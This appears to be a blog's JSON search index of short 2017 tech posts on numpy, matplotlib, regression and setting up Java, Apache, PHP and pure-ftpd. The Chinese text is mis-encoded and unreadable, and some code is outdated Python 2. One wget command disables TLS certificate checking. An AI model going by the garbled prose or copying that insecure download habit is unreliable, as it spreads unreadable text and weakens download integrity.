¹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"çº¿æ€§å›å½’","slug":"çº¿æ€§å›å½’","permalink":"https://wangxiuwen.github.io/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"name":"regression","slug":"regression","permalink":"https://wangxiuwen.github.io/tags/regression/"}],"author":"wangxiuwen"},{"title":"å›å½’","slug":"history/tech/5963973f8976b5fe0f14cb3e","date":"2017-07-10T03:03:27.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5963973f8976b5fe0f14cb3e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5963973f8976b5fe0f14cb3e/","excerpt":"","text":"å¦‚æœæ ·æœ¬æ•°å€¼ä¸ºè¿ç»­å€¼ï¼Œæˆ‘ä»¬å¯¹æ•°æ®çš„åˆ†æç§°ä¸ºå›å½’ã€‚åä¹‹ï¼Œå¦‚æœæ ·æœ¬çš„æ•°å€¼ä¸è¿ç»­ï¼Œæˆ‘ä»¬å¯¹æ•°æ®çš„åˆ†æç§°ä¹‹ä¸ºåˆ†ç±»ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"sklearn çš„ä½¿ç”¨","slug":"history/tech/596396dc8976b5fe0f14cb3d","date":"2017-07-10T03:01:48.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596396dc8976b5fe0f14cb3d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596396dc8976b5fe0f14cb3d/","excerpt":"","text":"http://scikit-learn.org/stable/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"sklearn","slug":"sklearn","permalink":"https://wangxiuwen.github.io/tags/sklearn/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ ç¬”è®°","slug":"history/tech/596395d78976b5fe0f14cb3c","date":"2017-07-10T02:57:27.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596395d78976b5fe0f14cb3c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596395d78976b5fe0f14cb3c/","excerpt":"","text":"python åº“çš„ä½¿ç”¨numpy çš„ä½¿ç”¨matplotlib çš„ä½¿ç”¨scipy çš„ä½¿ç”¨sklearn çš„ä½¿ç”¨ç®—æ³•å›å½’çº¿æ€§å›å½’Ridge å›å½’å†³ç­–æ ‘å’Œéšæœºæ£®æ—","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"matplotlib çš„ä½¿ç”¨","slug":"history/tech/596395a98976b5fe0f14cb3b","date":"2017-07-10T02:56:41.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596395a98976b5fe0f14cb3b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596395a98976b5fe0f14cb3b/","excerpt":"","text":"matplotlib çš„ä½¿ç”¨ æ–‡æ¡£åœ°å€http://matplotlib.org/ é»˜è®¤è§„åˆ™:import matplotlib as mpl import matplotlib.pyplot as plt è§£å†³ä¸­æ–‡å­—ä½“ç¼ºå¤±mpl.rcParams['font.sans-serif'] = [u'SimHei'] mpl.rcParams['axes.unicode_minus'] = False pltplt.plotplot(x, y) # xplot x and y using default line style and colorplot(x, y, â€˜boâ€™) # plot x and y using blue circle markersplot(y) # plot y using x as index array 0â€¦N-1plot(y, â€˜r+â€™) # ditto, but with red plussesplt.legendplt.legend(loc=â€˜lower rightâ€™)plt.gridplt.show åæ ‡è½´ åæ ‡åŒºé—´è®¾ç½®ä¾‹import numpy as np import matplotlib.pyplot as plt x = np.arange(-5, 5, 0.01) y = x**3 plt.axis([-6, 6, -10, 10]) plt.plot(x, y) plt.show() å¦å¤–ä¸€ç§è®¾ç½®æ–¹æ³• plt.xlim((xmin, xmax)) # è®¾ç½®xåæ ‡è½´çš„æœ€å¤§æœ€å°åŒºé—´ plt.xlim(xmin, xmax) plt.ylim((ymin, ymax)) # è®¾ç½®yåæ ‡è½´çš„æœ€å¤§æœ€å°åŒºé—´ plt.ylim(ymin, ymax) ç¤ºä¾‹ä»£ç : import numpy as np import matplotlib.pyplot as plt x = np.arange(-5, 5, 0.01) y = x**3 plt.plot(x,y) plt.xlim(-6, 6) plt.ylim(-500, 500) plt.show() è®¾ç½®ç½‘æ ¼çº¿plt.grid å‡½æ•°æä¾›æ˜¾ç¤ºç½‘æ ¼çš„é€‰é¡¹ï¼Œåœ¨ plot ä¹‹ååˆ™å¯ä»¥åœ¨åæ ‡ä¸Šæ˜¾ç¤ºç½‘æ ¼ import numpy as np import matplotlib.pyplot as plt x = np.arange(-5, 5, 0.01) y = x**3 plt.plot(x,y) plt.xlim(-6, 6) plt.ylim(-500, 500) plt.grid(True) plt.show() è‡ªå®šä¹‰åæ ‡è½´åˆ»åº¦ è‡ªåŠ¨æ ‡æ³¨åæ ‡è½´åˆ»åº¦çº¿æ¡æ”¯æŒçš„çº¿æ¡å½¢çŠ¶å’Œæ ‡è®°characterdescription'-'solid line style'--'dashed line style'-.'dash-dot line style':'dotted line style'.'point marker','pixel marker'o'circle marker'v'triangle_down marker'^'triangle_up marker'&lt;'triangle_left marker'&gt;'triangle_right marker'1'tri_down marker'2'tri_up marker'3'tri_left marker'4'tri_right marker's'square marker'p'pentagon marker'*'star marker'h'hexagon1 marker'H'hexagon2 marker'+'plus marker'x'x marker'D'diamond marker'd'thin_diamond markerâ€˜|â€™vline marker'_'hline markeræ”¯æŒçš„é¢œè‰²ç¼©å†™charactercolorâ€˜bâ€™blueâ€˜gâ€™greenâ€˜râ€™redâ€˜câ€™cyanâ€˜mâ€™magentaâ€˜yâ€™yellowâ€˜kâ€™blackâ€˜wâ€™whiteæ ‡ç­¾æ³¨é‡Šå›¾åƒæ’ç‰ˆ subplotsubplot(numRows, numCols, plotNum) plt.subplot(221) //åˆ†æˆ2x2ï¼Œå ç”¨ç¬¬ä¸€ä¸ªï¼Œå³ç¬¬ä¸€è¡Œç¬¬ä¸€åˆ—çš„å­å›¾ plt.subplot(222)//åˆ†æˆ2x2ï¼Œå ç”¨ç¬¬äºŒä¸ªï¼Œå³ç¬¬ä¸€è¡Œç¬¬äºŒåˆ—çš„å­å›¾ plt.subplot(212)//åˆ†æˆ2x1ï¼Œå ç”¨ç¬¬äºŒä¸ªï¼Œå³ç¬¬äºŒè¡Œ 3D ç»˜å›¾","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"matplotlib","slug":"matplotlib","permalink":"https://wangxiuwen.github.io/tags/matplotlib/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"numpy åº“çš„ä½¿ç”¨","slug":"history/tech/596394978976b5fe0f14cb3a","date":"2017-07-10T02:52:07.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596394978976b5fe0f14cb3a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596394978976b5fe0f14cb3a/","excerpt":"","text":"numpy åº“çš„ä½¿ç”¨ æ–‡æ¡£åœ°å€http://numpy.org/ é»˜è®¤è§„åˆ™:import numpy as np åˆ—è¡¨ï¼šæ ‡å‡†Pythonçš„åˆ—è¡¨(list)ä¸­ï¼Œå…ƒç´ æœ¬è´¨æ˜¯å¯¹è±¡ã€‚å¦‚ï¼šL = [1, 2, 3]ï¼Œéœ€è¦3ä¸ªæŒ‡é’ˆå’Œä¸‰ä¸ªæ•´æ•°å¯¹è±¡ï¼Œå¯¹äºæ•°å€¼è¿ç®—æ¯”è¾ƒæµªè´¹å†…å­˜å’ŒCPUã€‚å› æ­¤ï¼ŒNumpyæä¾›äº†ndarray(N-dimensional array object)å¯¹è±¡ï¼šå­˜å‚¨å•ä¸€æ•°æ®ç±»å‹çš„å¤šç»´æ•°ç»„ã€‚ä¾‹ï¼šé€šè¿‡arrayå‡½æ•°ä¼ é€’listå¯¹è±¡ï¼šL = [1, 2, 3, 4, 5, 6]a = np.array(L)print aprint type(a)è‹¥ä¼ é€’çš„æ˜¯å¤šå±‚åµŒå¥—çš„listï¼Œå°†åˆ›å»ºå¤šç»´æ•°ç»„:b = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]]) print b æ•°ç»„å¤§å°å¯ä»¥é€šè¿‡å…¶shapeå±æ€§è·å¾—:print a.shape a.shape = 4, 3 print b æ³¨ï¼šä»(3,4)æ”¹ä¸º(4,3)å¹¶ä¸æ˜¯å¯¹æ•°ç»„è¿›è¡Œè½¬ç½®ï¼Œè€Œåªæ˜¯æ”¹å˜æ¯ä¸ªè½´çš„å¤§å°ï¼Œæ•°ç»„å…ƒç´ åœ¨å†…å­˜ä¸­çš„ä½ç½®å¹¶æ²¡æœ‰æ”¹å˜å½“æŸä¸ªè½´ä¸º-1æ—¶ï¼Œå°†æ ¹æ®æ•°ç»„å…ƒç´ çš„ä¸ªæ•°è‡ªåŠ¨è®¡ç®—æ­¤è½´çš„é•¿åº¦:b.shape = 2, -1 print b print b.shape b.shape = 3, 4 ä½¿ç”¨reshapeæ–¹æ³•ï¼Œå¯ä»¥åˆ›å»ºæ”¹å˜äº†å°ºå¯¸çš„æ–°æ•°ç»„ï¼ŒåŸæ•°ç»„çš„shapeä¿æŒä¸å˜c = b.reshape(4, -1) print &quot;b = \\n&quot;, b print 'c = \\n', c æ•°ç»„bå’Œcå…±äº«å†…å­˜ï¼Œä¿®æ”¹ä»»æ„ä¸€ä¸ªå°†å½±å“å¦å¤–ä¸€ä¸ª:b[0][1] = 20 print &quot;b = \\n&quot;, b print &quot;c = \\n&quot;, c æ•°ç»„çš„å…ƒç´ ç±»å‹å¯ä»¥é€šè¿‡dtypeå±æ€§è·å¾—:print a.dtype print b.dtype å¯ä»¥é€šè¿‡dtypeå‚æ•°åœ¨åˆ›å»ºæ—¶æŒ‡å®šå…ƒç´ ç±»å‹:d = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]], dtype=np.float) f = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]], dtype=np.complex) print d print f å¦‚æœæ›´æ”¹å…ƒç´ ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨astypeå®‰å…¨çš„è½¬æ¢f = d.astype(np.int) print f ä½†ä¸è¦å¼ºåˆ¶ä»…ä¿®æ”¹å…ƒç´ ç±»å‹ï¼Œå¦‚ä¸‹é¢è¿™å¥ï¼Œå°†ä¼šä»¥intæ¥è§£é‡Šå•ç²¾åº¦floatç±»å‹d.dtype = np.int print d np.arangenp.arange å‡½æ•°ç±»ä¼¼äºpythonçš„rangeå‡½æ•°, é€šè¿‡æŒ‡å®šèµ·å§‹å€¼ã€ç»ˆæ­¢å€¼å’Œæ­¥é•¿æ¥åˆ›å»ºæ•°ç»„ç”ŸæˆçŸ©é˜µï¼Œå’ŒPythonçš„rangeç±»ä¼¼ï¼ŒarangeåŒæ ·ä¸åŒ…æ‹¬ç»ˆå€¼ï¼›ä½†arangeå¯ä»¥ç”Ÿæˆæµ®ç‚¹ç±»å‹ï¼Œè€Œrangeåªèƒ½æ˜¯æ•´æ•°ç±»å‹:np.arange(èµ·å§‹å€¼, ç»ˆæ­¢å€¼, æ­¥é•¿) ä¾‹:np.arange(0, 60, 10)æ”¹å˜å½¢çŠ¶ï¼šnp.arange(0, 60, 10).reshape((-1, 1)) ç›¸åŠ (è¡Œåˆ—åˆ†åˆ«ç›¸åŠ )ï¼ša = np.arange(0, 60, 10).reshape((-1, 1)) + np.arange(6) np.linspacenp.linspace å‡½æ•°é€šè¿‡æŒ‡å®šèµ·å§‹å€¼ã€ç»ˆæ­¢å€¼å’Œå…ƒç´ ä¸ªæ•°æ¥åˆ›å»ºæ•°ç»„ï¼Œç¼ºçœåŒ…æ‹¬ç»ˆæ­¢å€¼:b = np.linspace(1, 10, 10) print 'b = ', b å¯ä»¥é€šè¿‡endpointå…³é”®å­—æŒ‡å®šæ˜¯å¦åŒ…æ‹¬ç»ˆå€¼:c = np.linspace(1, 10, 10, endpoint=False) print 'c = ', c ç»ˆæ­¢å€¼é»˜è®¤ä¸º 50:np.linspace(0, 10) array([ 0. , 0.20408163, 0.40816327, 0.6122449 , 0.81632653, 1.02040816, 1.2244898 , 1.42857143, 1.63265306, 1.83673469, 2.04081633, 2.24489796, 2.44897959, 2.65306122, 2.85714286, 3.06122449, 3.26530612, 3.46938776, 3.67346939, 3.87755102, 4.08163265, 4.28571429, 4.48979592, 4.69387755, 4.89795918, 5.10204082, 5.30612245, 5.51020408, 5.71428571, 5.91836735, 6.12244898, 6.32653061, 6.53061224, 6.73469388, 6.93877551, 7.14285714, 7.34693878, 7.55102041, 7.75510204, 7.95918367, 8.16326531, 8.36734694, 8.57142857, 8.7755102 , 8.97959184, 9.18367347, 9.3877551 , 9.59183673, 9.79591837, 10. ]) np.logspaceå’Œlinspaceç±»ä¼¼ï¼Œlogspaceå¯ä»¥åˆ›å»ºç­‰æ¯”æ•°åˆ—ä¸‹é¢å‡½æ•°åˆ›å»ºèµ·å§‹å€¼ä¸º101ï¼Œç»ˆæ­¢å€¼ä¸º102ï¼Œæœ‰20ä¸ªæ•°çš„ç­‰æ¯”æ•°åˆ—d = np.logspace(1, 2, 10, endpoint=True) print d ä¸‹é¢åˆ›å»ºèµ·å§‹å€¼ä¸º20ï¼Œç»ˆæ­¢å€¼ä¸º210(åŒ…æ‹¬)ï¼Œæœ‰10ä¸ªæ•°çš„ç­‰æ¯”æ•°åˆ—f = np.logspace(0, 10, 11, endpoint=True, base=2) print f np.frombuffer, np.fromstring, np.fromfileä½¿ç”¨ np.frombuffer, np.fromstring, np.fromfile ç­‰å‡½æ•°å¯ä»¥ä»å­—èŠ‚åºåˆ—åˆ›å»ºæ•°ç»„s = 'abcd' g = np.fromstring(s, dtype=np.int8) print g math åº“çš„å®ç°sin cos logç”»ä¸€ä¸ªæ­£å¼¦å‡½æ•°åœ¨åŒºé—´ [-pi, pi] çš„å›¾åƒ:x = np.arange(-np.pi, np.pi, 0.01) y = np.sin(x) å­˜å–æ•°ç»„å…ƒç´ çš„å­˜å–æ–¹æ³•å’ŒPythonçš„æ ‡å‡†æ–¹æ³•ç›¸åŒéšæœºç”Ÿæˆæ•°ç»„:a = np.arange(10) print a è·å–æŸä¸ªå…ƒç´ :print a[3] åˆ‡ç‰‡[3,6)ï¼Œå·¦é—­å³å¼€:print a[3:6] çœç•¥å¼€å§‹ä¸‹æ ‡ï¼Œè¡¨ç¤ºä»0å¼€å§‹:print a[:5] çœç•¥ç»“æŸä¸‹æ ‡ï¼Œè¡¨ç¤ºåˆ°æœ€åä¸€ä¸ª:print a[3:] ä¸‹æ ‡ä¸ºè´Ÿè¡¨ç¤ºä»åå‘å‰æ•°:print a[3:-2] æ­¥é•¿ä¸º2:print a[1:9:2] æ­¥é•¿ä¸º-1ï¼Œå³ç¿»è½¬print a[::-1] åˆ‡ç‰‡æ•°æ®æ˜¯åŸæ•°ç»„çš„ä¸€ä¸ªè§†å›¾ï¼Œä¸åŸæ•°ç»„å…±äº«å†…å®¹ç©ºé—´ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å…ƒç´ å€¼a[1:4] = 10, 20, 30 print a å› æ­¤ï¼Œåœ¨å®è·µä¸­ï¼Œåˆ‡å®æ³¨æ„åŸå§‹æ•°æ®æ˜¯å¦è¢«ç ´åï¼Œå¦‚ï¼šb = a[2:5] b[0] = 200 print a æ•´æ•°/å¸ƒå°”æ•°ç»„å­˜å–æ ¹æ®æ•´æ•°æ•°ç»„å­˜å–ï¼šå½“ä½¿ç”¨æ•´æ•°åºåˆ—å¯¹æ•°ç»„å…ƒç´ è¿›è¡Œå­˜å–æ—¶ï¼Œå°†ä½¿ç”¨æ•´æ•°åºåˆ—ä¸­çš„æ¯ä¸ªå…ƒç´ ä½œä¸ºä¸‹æ ‡ï¼Œæ•´æ•°åºåˆ—å¯ä»¥æ˜¯åˆ—è¡¨(list)æˆ–è€…æ•°ç»„(ndarray)ã€‚ä½¿ç”¨æ•´æ•°åºåˆ—ä½œä¸ºä¸‹æ ‡è·å¾—çš„æ•°ç»„ä¸å’ŒåŸå§‹æ•°ç»„å…±äº«æ•°æ®ç©ºé—´ã€‚ç”Ÿæˆæ•°æ®a = np.logspace(0, 9, 10, base=2) print a i = np.arange(0, 10, 2) print i åˆ©ç”¨iå–aä¸­çš„å…ƒç´ b = a[i] print b bçš„å…ƒç´ æ›´æ”¹ï¼Œaä¸­å…ƒç´ ä¸å—å½±å“b[2] = 1.6 print b print a ä½¿ç”¨å¸ƒå°”æ•°ç»„iä½œä¸ºä¸‹æ ‡å­˜å–æ•°ç»„aä¸­çš„å…ƒç´ ï¼šè¿”å›æ•°ç»„aä¸­æ‰€æœ‰åœ¨æ•°ç»„bä¸­å¯¹åº”ä¸‹æ ‡ä¸ºTrueçš„å…ƒç´ a = np.random.rand(10) #ç”Ÿæˆ10ä¸ªæ»¡è¶³[0,1)ä¸­å‡åŒ€åˆ†å¸ƒçš„éšæœºæ•° print a print a &gt; 0.5 #å¤§äº0.5çš„å…ƒç´ ç´¢å¼• b = a[a &gt; 0.5] #å¤§äº0.5çš„å…ƒç´  print b å°†åŸæ•°ç»„ä¸­å¤§äº0.5çš„å…ƒç´ æˆªå–æˆ0.5a[a &gt; 0.5] = 0.5 print a print b #bä¸å—å½±å“ äºŒç»´æ•°ç»„çš„åˆ‡ç‰‡ç”Ÿæˆæ•°æ®a = np.arange(0, 60, 10) # è¡Œå‘é‡ print 'a = ', a b = a.reshape((-1, 1)) # è½¬æ¢æˆåˆ—å‘é‡ print b c = np.arange(6) print c f = b + c # è¡Œ + åˆ— print f åˆå¹¶ä¸Šè¿°ä»£ç ï¼ša = np.arange(0, 60, 10).reshape((-1, 1)) + np.arange(6) print a [[ 0 1 2 3 4 5] [10 11 12 13 14 15] [20 21 22 23 24 25] [30 31 32 33 34 35] [40 41 42 43 44 45] [50 51 52 53 54 55]] äºŒç»´æ•°ç»„çš„åˆ‡ç‰‡print a[(0,1,2,3), (2,3,4,5)] [ 2 13 24 35] print a[3:, [0, 2, 5]] [[30 32 35] [40 42 45] [50 52 55]] i = np.array([True, False, True, False, False, True]) print a[i] [[ 0 1 2 3 4 5] [20 21 22 23 24 25] [50 51 52 53 54 55]] print a[i, 3] [ 3 23 53] ç§‘å­¦è®¡ç®—np.exp(x) è®¡ç®— e çš„ x æ¬¡æ–¹https://docs.scipy.org/doc/numpy-1.10.1/reference/generated/numpy.exp.htmlimport numpy as np # example of np.exp x = np.array([1, 2, 3]) print(np.exp(x)) # result is (exp(1), exp(2), exp(3))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"linux ä¸‹å‘½ä»¤è¡Œå®‰è£… oracle java çš„ command","slug":"history/tech/5963931d8976b5fe0f14cb39","date":"2017-07-10T02:45:49.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5963931d8976b5fe0f14cb39/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5963931d8976b5fe0f14cb39/","excerpt":"","text":"command: wget --no-check-certificate --no-cookies --header &quot;Cookie: oraclelicense=accept-securebackup-cookie&quot; http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.tar.gz","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"java","slug":"java","permalink":"https://wangxiuwen.github.io/tags/java/"}],"author":"wangxiuwen"},{"title":"å¥½æ•™ç¨‹æ”¶é›†","slug":"history/tech/596392498976b5fe0f14cb38","date":"2017-07-10T02:42:17.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596392498976b5fe0f14cb38/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596392498976b5fe0f14cb38/","excerpt":"","text":"åŸºäºæ–‡å­¦ç¼–ç¨‹ç†å¿µè®¾è®¡çš„ React Native å…¥é—¨æ•™ç¨‹, å¾ªåºæ¸è¿›çš„æä¾› Material é£æ ¼ Dribbble ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯å¼€å‘æŒ‡å¼•:)https://github.com/borisding1994/RNMaterialDribbbleæ—¥å¿—æ”¶é›†ä¸éƒ¨ç½²æ–‡æ¡£https://pengqiuyuan.gitbooks.io/elkbook/content/OpenRestyæœ€ä½³å®è·µhttps://moonbingbing.gitbooks.io/openresty-best-practices/content/lua/main.htmlPythonæ–°å‘˜å·¥æ•™æhttps://chu888chu888.gitbooks.io/pythonstudy/content/é¦™è‰https://moonbingbing.gitbooks.io/openresty-best-practices/content/others/vanilla/intro.htmlgitæ•™ç¨‹http://git.oschina.net/progit/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æ•™ç¨‹","slug":"æ•™ç¨‹","permalink":"https://wangxiuwen.github.io/tags/%E6%95%99%E7%A8%8B/"}],"author":"wangxiuwen"},{"title":"lora æ¼”ç¤ºç½‘å€","slug":"history/tech/596391198976b5fe0f14cb37","date":"2017-07-10T02:37:13.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596391198976b5fe0f14cb37/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596391198976b5fe0f14cb37/","excerpt":"","text":"demonstrator","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"lora","slug":"lora","permalink":"https://wangxiuwen.github.io/tags/lora/"},{"name":"semtech","slug":"semtech","permalink":"https://wangxiuwen.github.io/tags/semtech/"}],"author":"wangxiuwen"},{"title":"git windows  å®¢æˆ·ç«¯ Segmentation fault","slug":"history/tech/5963438634d44ca80cc288cf","date":"2017-07-09T21:06:14.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5963438634d44ca80cc288cf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5963438634d44ca80cc288cf/","excerpt":"","text":"è¿™æ˜¯git å®¢æˆ·ç«¯çš„bugï¼Œå‡çº§å³å¯git --version git version 2.13.1.windows.2 for git commit command (Windows)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"Invalid command 'Header'","slug":"history/tech/5963434134d44ca80cc288ce","date":"2017-07-09T21:05:05.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5963434134d44ca80cc288ce/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5963434134d44ca80cc288ce/","excerpt":"","text":"Invalid command â€˜Headerâ€™sudo a2enmod headers sudo service apache2 restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"apache","slug":"apache","permalink":"https://wangxiuwen.github.io/tags/apache/"}],"author":"wangxiuwen"},{"title":"ubuntu é…ç½® php å¼€å‘ç¯å¢ƒ","slug":"history/tech/596340b634d44ca80cc288cd","date":"2017-07-09T20:54:14.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596340b634d44ca80cc288cd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596340b634d44ca80cc288cd/","excerpt":"","text":"å…ˆæ›´æ–°ç³»ç»Ÿï¼šapt update å®‰è£…php7:apt install php å®‰è£…apacheapt install apache2 å®‰è£…apache php æ‰©å±•:apt-get install libapache2-mod-php //é…ç½®APACHE+PHP pdo_mysql:apt install php-mysql é‡å¯apache:apachectl restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"php","slug":"php","permalink":"https://wangxiuwen.github.io/tags/php/"},{"name":"pdo_mysql","slug":"pdo-mysql","permalink":"https://wangxiuwen.github.io/tags/pdo-mysql/"}],"author":"wangxiuwen"},{"title":"pure-ftpd å®‰è£…","slug":"history/tech/596314c334d44ca80cc288cc","date":"2017-07-09T17:46:43.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596314c334d44ca80cc288cc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596314c334d44ca80cc288cc/","excerpt":"","text":"è·å–:wget https://download.pureftpd.org/pub/pure-ftpd/releases/pure-ftpd-1.0.46.tar.gz è§£å‹:tar -xzvf pure-ftpd-1.0.46.tar.gz é…ç½®:cd pure-ftpd-1.0.46/ ./configure --prefix=/usr/local/pure-ftpd/ --with-language=english --with-everything ç¼–è¯‘å®‰è£…:make &amp;&amp; make check &amp;&amp; make install å¢åŠ ç³»ç»Ÿç”¨æˆ·:useradd ftpuser -g ftpgroup -d /data -s /sbin/nologin å¢åŠ è™šæ‹Ÿç”¨æˆ·:pure-pw useradd test -u ftpuser -d /data ç”Ÿæˆæ•°æ®æ–‡ä»¶:pure-pw mkdb 